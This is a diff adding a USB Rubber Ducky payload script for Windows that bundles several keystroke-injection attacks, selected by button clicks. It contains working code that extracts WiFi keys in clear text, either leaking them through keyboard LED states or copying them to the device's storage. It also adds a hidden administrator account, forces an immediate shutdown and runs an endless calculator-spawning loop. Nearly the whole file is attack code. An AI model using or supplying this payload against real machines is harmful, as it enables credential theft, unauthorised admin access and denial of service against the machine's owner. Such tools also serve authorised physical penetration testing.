@@ -1,0 +1,203 @@
+REM Title: One Duck To Quack Them All
+REM Author: SaintCrossbow
+REM Description: Pack multiple attacks in a single payload - click button to advance the attack
+REM Click 1: LED G slow blink - Stealth exfil WiFi key (modified from original Hak5 payload)
+REM Click 2: LED R slow blink - Direct USB copy of WiFi keys
+REM Click 3: LED G fast blink - Add backdoor user
+REM Click 4: LED R fast blink - Shutdown PC immediately
+REM Click 5: LED R/G alternate - Fork bomb (really resource bomb)
+REM Click 6: LED G morse A - USB storage
+REM Target: Windows
+REM Props: Darren Kitchen for the basis of stealth copy of wifi key
+
+ATTACKMODE HID
+DELAY 2000
+LED_G
+
+VAR $MODESELECT = 0
+VAR $CLICK_OBS_WINDOW = 5000
+VAR $CLICK_OBS_TIME = 0
+VAR $CLICK_TICK = 800
+
+FUNCTION QUIET_STEAL_WIFI()
+  LED_R
+  ATTACKMODE HID
+  $_JITTER_ENABLED = TRUE
+  DELAY 2000
+  GUI r
+  DELAY 1000
+  STRING powershell "$cssid= (Get-NetConnectionProfile).Name[0]; netsh wlan show profile name=("$cssid") key=clear|?{$_-match'SSID n|Key C'}|%{($_ -split':')[1]}>$env:tmp\tmptst"
+  DELAY 300
+  ENTER
+  DELAY 3000
+  GUI r
+  DELAY 300
+  $_JITTER_ENABLED = FALSE
+  STRINGLN powershell "foreach($b in $(cat $env:tmp\tmptst -En by)){foreach($a in 0x80,0x40,0x20,0x10,0x08,0x04,0x02,0x01){if($b-band$a){$o+='%{NUMLOCK}'} else {$o+='%{CAPSLOCK}'}}};$o+='%{SCROLLLOCK}';echo $o >$env:tmp\tmptst"
+  DELAY 100
+  GUI r
+  DELAY 300
+  STRING powershell "$o=(cat $env:tmp\tmptst);Add-Type -A System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait($o);rm $env:tmp\tmptst"
+  DELAY 100
+  SAVE_HOST_KEYBOARD_LOCK_STATE
+  $_EXFIL_MODE_ENABLED = TRUE
+  $_EXFIL_LEDS_ENABLED = TRUE
+  DELAY 100
+  ENTER
+  WAIT_FOR_SCROLL_CHANGE
+  LED_G
+  $_EXFIL_MODE_ENABLED = FALSE
+  $_EXFIL_LEDS_ENABLED = FALSE
+  RESTORE_HOST_KEYBOARD_LOCK_STATE 
+END_FUNCTION
+
+FUNCTION DIRECT_STEAL_WIFI()
+  REM TODO Replace in final payload with DUCKY
+  LED_R
+  HIDE_PAYLOAD
+  ATTACKMODE HID STORAGE
+  $_JITTER_ENABLED = TRUE
+  DELAY 9000
+  GUI r
+  DELAY 1500
+  STRINGLN powershell 
+  DELAY 3000
+  STRINGLN $d=(Get-Volume -FileSystemLabel 'Ducky').DriveLetter+':'; cd $d; netsh wlan export profile key=clear 
+  DELAY 3000
+  STRINGLN exit
+  RESTORE_PAYLOAD
+  LED_G
+END_FUNCTION
+
+FUNCTION CREATE_BACKDOOR()
+  LED_R
+  ATTACKMODE HID
+  $_JITTER_ENABLED = TRUE
+  DELAY 2000
+  GUI r
+  DELAY 1000
+  STRING cmd
+  DELAY 500
+  CTRL-SHIFT ENTER
+  DELAY 2000
+  ALT y
+  DELAY 1000
+  STRINGLN net user /add newuser newpass
+  DELAY 500
+  STRINGLN net localgroup administrators newuser /add
+  DELAY 500
+  STRINGLN exit
+  LED_G
+END_FUNCTION
+
+REM I realize this is more of an iterative power hog than a strictly ballroom fork bomb
+FUNCTION FORK_BOMB()
+  LED_R
+  ATTACKMODE HID
+  $_JITTER_ENABLED = TRUE
+  DELAY 2000
+  GUI r
+  DELAY 1000
+  STRING powershell "while(1){&calc}"
+  DELAY 200
+  ENTER
+END_FUNCTION
+
+FUNCTION IMMEDIATE_SHUTDOWN()
+  LED_R
+  ATTACKMODE HID
+  $_JITTER_ENABLED = TRUE
+  DELAY 2000
+  GUI r
+  DELAY 1000
+  STRING shutdown -t 0 -f -s
+  DELAY 200
+  ENTER
+END_FUNCTION
+
+REM Default is single click
+LED_G
+WAIT_FOR_BUTTON_PRESS
+
+REM Clicking resets observation time to ensure you have right mode
+REM So any attack will delay for $CLICK_OBS_WINDOW seconds
+BUTTON_DEF
+  $CLICK_OBS_TIME = 0
+  $MODESELECT = ( $MODESELECT + 1 )  
+END_BUTTON
+
+REM Start the attack
+WHILE ( $CLICK_OBS_TIME < $CLICK_OBS_WINDOW )
+  IF ( $MODESELECT == 0) THEN
+    LED_G
+  ELSE IF ( $MODESELECT == 1 ) THEN
+    LED_R
+  ELSE IF ( $MODESELECT == 2 ) THEN
+    LED_G
+    DELAY 100
+    LED_OFF
+    DELAY 100
+    LED_G
+    DELAY 100
+    LED_OFF
+    DELAY 100
+    LED_G
+    DELAY 100
+  ELSE IF ( $MODESELECT == 3 ) THEN
+    LED_R
+    DELAY 100
+    LED_OFF
+    DELAY 100
+    LED_R
+    DELAY 100
+    LED_OFF
+    DELAY 100
+    LED_R
+    DELAY 100
+  ELSE IF ( $MODESELECT == 4 ) THEN
+    LED_R
+    DELAY 200
+    LED_G
+    DELAY 200
+    LED_R
+    DELAY 200
+    LED_G
+    DELAY 200
+  ELSE 
+	LED_G
+	DELAY 100
+	LED_OFF
+	DELAY 100
+    LED_G
+	DELAY 500
+	LED_OFF
+	DELAY 100
+  END_IF
+  DELAY $CLICK_TICK
+  $CLICK_OBS_TIME = ( $CLICK_OBS_TIME + $CLICK_TICK )
+  LED_OFF
+  DELAY $CLICK_TICK
+  $CLICK_OBS_TIME = ( $CLICK_OBS_TIME + $CLICK_TICK )
+END_WHILE
+
+REM Main attack
+IF ( $MODESELECT == 0) THEN
+  QUIET_STEAL_WIFI()
+  RESTART_PAYLOAD
+ELSE IF ( $MODESELECT == 1 ) THEN
+  DIRECT_STEAL_WIFI()
+  RESTART_PAYLOAD
+ELSE IF ( $MODESELECT == 2 ) THEN
+  CREATE_BACKDOOR()
+  RESTART_PAYLOAD
+ELSE IF ( $MODESELECT == 3 ) THEN
+  IMMEDIATE_SHUTDOWN()
+ELSE IF ( $MODESELECT == 4 ) THEN
+  FORK_BOMB()
+ELSE
+  BUTTON_DEF
+    RESTART_PAYLOAD
+  END_BUTTON
+  ATTACKMODE HID STORAGE
+  LED_G
+END_IF
